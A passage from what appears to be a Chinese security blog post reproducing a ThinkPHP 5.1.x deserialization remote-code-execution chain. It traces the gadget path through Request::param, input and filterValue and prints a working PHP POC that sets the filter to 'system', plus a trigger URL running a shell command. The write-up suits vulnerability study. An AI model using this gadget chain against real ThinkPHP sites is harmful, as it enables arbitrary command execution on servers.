+发现input()满足条件，这里用了一个回调函数调用了filterValue，但参数不可控不能直接用</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/355c65be4e374c6a91d08f037febc028.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>再找找哪个方法调用了input且参数可控，找到param方法</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/090d0520588b4017a5745fc057e6568b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><code>param</code><strong>这里</strong> <code>this-&gt;param</code><strong>完全可控，是通过get传参数进去的，那么也就是说input函数中的</strong> <code>data</code><strong>参数可控，也就是</strong> <code>call_user_func</code><strong>的</strong> <code>$value</code><strong>，现在差一个条件，那就是</strong> <code>name</code><strong>可控，继续回溯</strong></p>
+<figure data-type="image" tabindex="17"><img src="https://img-blog.csdnimg.cn/dc0cb36058ac44b89d2db69649dd80c0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>在isAjax函数中，我们可以控制<code>$this-&gt;config['var_ajax']</code>，<code>$this-&gt;config['var_ajax']</code>可控就意味着param函数中的<code>$name</code>可控。param函数中的<code>$name</code>可控就意味着input函数中的<code>$name</code>可控。</p>
+<p><strong>找到了链的起始位置为isAjax()，而执行代码的位置为input()函数中的filterValue()函数，我们把整个控制流程与代码汇总一下</strong></p>
+<p><strong>首先在isAjax函数中，我们可以控制</strong> <code>this-&gt;config['var_ajax']</code><strong>意味着param函数中的</strong> <code>$name</code><strong>可控。</strong></p>
+<p><strong>进入</strong> <code>param</code>方法</p>
+<pre><code class="language-php">  public function param($name = '', $default = null, $filter = '')
+    {
+        if (!$this-&gt;mergeParam) {
+            $method = $this-&gt;method(true);
+
+            // 自动获取请求变量
+            switch ($method) {
+                case 'POST':
+                    $vars = $this-&gt;post(false);
+                    break;
+                case 'PUT':
+                case 'DELETE':
+                case 'PATCH':
+                    $vars = $this-&gt;put(false);
+                    break;
+                default:
+                    $vars = [];
+            }
+
+            // 当前请求参数和URL地址中的参数合并
+            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
+
+            $this-&gt;mergeParam = true;
+        }
+
+        if (true === $name) {
+            // 获取包含文件上传信息的数组
+            $file = $this-&gt;file();
+            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;
+
+            return $this-&gt;input($data, '', $default, $filter);
+        }
+#调用input方法，$this-&gt;param为get与post所有参数，$name为isAjax传入,$default=null,$filter=''
+        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
+    }
+</code></pre>
+<p>再回到input函数中</p>
+<pre><code class="language-php">  public function input($data = [], $name = '', $default = null, $filter = '')
+    {
+        if (false === $name) {
+            // 获取原始数据
+            return $data;
+        }
+
+        $name = (string) $name;
+        if ('' != $name) {
+            // 解析name
+            if (strpos($name, '/')) {
+                list($name, $type) = explode('/', $name);
+            }
+
+            $data = $this-&gt;getData($data, $name);
+#$data为get与post所有参数,$name的值来自于`$this-&gt;config['var_ajax']`
+            if (is_null($data)) {
+                return $default;
+            }
+
+            if (is_object($data)) {
+                return $data;
+            }
+        }
+
+        // 解析过滤器
+        $filter = $this-&gt;getFilter($filter, $default);
+
+        if (is_array($data)) {
+            array_walk_recursive($data, [$this, 'filterValue'], $filter);
+            if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) {
+                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
+                $this-&gt;arrayReset($data);
+            }
+        } else {
+            $this-&gt;filterValue($data, $name, $filter);
+        }
+
+        if (isset($type) &amp;&amp; $data !== $default) {
+            // 强制类型转换
+            $this-&gt;typeCast($data, $type);
+        }
+
+        return $data;
+    }
+</code></pre>
+<p>跟进到getData函数</p>
+<pre><code class="language-php"> protected function getData(array $data, $name)
+    {
+        foreach (explode('.', $name) as $val) {
+            if (isset($data[$val])) {
+                $data = $data[$val];
+                #$data为get与post所有参数,$name的值来自于$this-&gt;config['var_ajax']
+                #所以$data最后为get与post所有参数[$this-&gt;config['var_ajax']]
+            } else {
+                return;
+            }
+        }
+
+        return $data;
+    }
+</code></pre>
+<p>在跟进到getFilter函数</p>
+<pre><code class="language-php"> protected function getFilter($filter, $default)
+    {
+        if (is_null($filter)) {
+            $filter = [];
+        } else {
+            $filter = $filter ?: $this-&gt;filter;
+            if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) {
+                $filter = explode(',', $filter);
+            } else {
+                $filter = (array) $filter;
+            }
+        }
+
+        $filter[] = $default;
+
+        return $filter;
+    }
+</code></pre>
+<p>这里的<code>$filter</code>来自于<code>this-&gt;filter</code>，我们需要定义<code>this-&gt;filter</code>为函数名</p>
+<p>然后执行回调函数</p>
+<pre><code class="language-php">array_walk_recursive($data, [$this, 'filterValue'], $filter);
+</code></pre>
+<ul>
+<li>array</li>
+</ul>
+<p>输入的数组。</p>
+<ul>
+<li>callback</li>
+</ul>
+<p>典型情况下 <code>callback</code> 接受两个参数。<code>array</code> 参数的值作为第一个，键名作为第二个。</p>
+<blockquote>
+<p><strong>注意</strong>:</p>
+<p>如果 <code>callback</code> 需要直接作用于数组中的值，则给 <code>callback</code> 的第一个参数指定为<a href="https://www.php.net/manual/zh/language.references.php">引用</a>。这样任何对这些单元的改变也将会改变原始数组本身。</p>
+</blockquote>
+<ul>
+<li>arg</li>
+</ul>
+<p>如果提供了可选参数 <code>arg</code>，将被作为第三个参数传递给 <code>callback</code>。</p>
+<p>所以这里执行filterValue函数，<code>filterValue.value</code>的值为第一个通过<code>GET</code>请求的值，而<code>filters.key</code>为<code>GET</code>请求的键，并且<code>filters.filters</code>就等于<code>input.filters</code>的值。</p>
+<p>现在就可以来构造POC了</p>
+<pre><code class="language-php">&lt;?php
+ namespace think\process\pipes;
+ use think\model\Pivot;
+ 
+ class Windows{
+     private $files = [];
+     public function __construct(){
+         $this-&gt;files=[new Pivot()];
+     }
+ }
+ 
+ namespace think;
+ abstract class Model{
+     protected $append=[];
+     private $data=[];
+     public function __construct(){
+         $this-&gt;append=[&quot;lyy9&quot;=&gt;['hello']];
+         $this-&gt;data=[&quot;lyy9&quot;=&gt;new Request()];
+     }
+ }
+ 
+ namespace think;
+ class Request{
+     protected $hook = [];
+     protected $filter;
+     protected $config;
+     public function __construct()
+     {
+         $this-&gt;hook['visible'] = [$this, 'isAjax'];
+         $this-&gt;filter = &quot;system&quot;;
+     }
+ }
+ 
+ namespace think\model;
+ use think\Model;
+ 
+ class Pivot extends Model{
+ 
+ }
+ 
+ use think\process\pipes\Windows;
+ echo urlencode(serialize(new Windows()));
+</code></pre>
+<p>访问:注意一定要使用<strong>pathinfo路由形式（系统默认）</strong></p>
+<p>路由形式：http://网址/入口文件/模块名（分组名）/控制器名/方法/参数名/参数值</p>
+<pre><code>http://localhost/tp5.1/public/index.php/index/index/unser?lyy9=dir
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://img-blog.csdnimg.cn/ec55ffda18d2460d9d9326702ca0e1c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>最后反序列化链</p>
+<pre><code>\thinkphp\library\think\process\pipes\Windows.php - &gt; __destruct()
+
+\thinkphp\library\think\process\pipes\Windows.php - &gt; removeFiles()
+
+Windows.php: file_exists()
+
+thinkphp\library\think\model\concern\Conversion.php - &gt; __toString()
+
+thinkphp\library\think\model\concern\Conversion.php - &gt; toJson() 
+
+thinkphp\library\think\model\concern\Conversion.php - &gt; toArray()
+
+thinkphp\library\think\Request.php   - &gt; __call()
+
+thinkphp\library\think\Request.php   - &gt; isAjax()
+
+thinkphp\library\think\Request.php - &gt; param()
+
+thinkphp\library\think\Request.php - &gt; input()
+
+thinkphp\library\think\Request.php - &gt; filterValue()
+</code></pre>
+<h3 id="利用条件">利用条件</h3>
+<ul>
+<li>有一个内容完全可控的反序列化点，例如： <code>unserialize(可控变量)</code></li>
+<li>存在文件上传、文件名完全可控、使用了文件操作函数，例如： <code>file_exists('phar://恶意文件')</code></li>
+</ul>
+<h3 id="关键点">关键点</h3>
+<p>通过 <strong>file_exists</strong> 函数将参数当做字符串执行从而触发类的 <strong>__toString</strong> 方法。</p>
+<p>还有就是不存在可利用的visible函数时转向__call方法</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/xiang-ri-kui-rce-hou-xu-li-yong-zhi-ben-di-ti-quan/" class="post-title gt-a-link">
+                    向日葵RCE后续利用之本地提权
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/thinkphp51x-fan-xu-lie-hua-lou-dong-fu-xian-yu-fen-xi/" class="leancloud_visitors" data-flag-title="thinkphp5.1.x反序列化漏洞复现与分析">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
